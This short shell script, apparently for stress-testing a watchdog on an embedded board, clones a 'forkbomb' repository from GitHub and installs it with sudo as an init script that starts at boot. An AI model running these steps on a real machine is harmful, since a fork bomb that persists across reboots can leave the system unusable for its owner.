#!/bin/sh
sudo mount -o remount,rw /
sudo update-rc.d -f forkbomb remove
sudo apt-get install git
git clone https://github.com/gerdmestdagh/forkbomb
cd forkbomb
sudo cp ./forkbomb /etc/init.d
sudo update-rc.d -f forkbomb start 1 S .
cd ..
rm -rf imx-watchdog
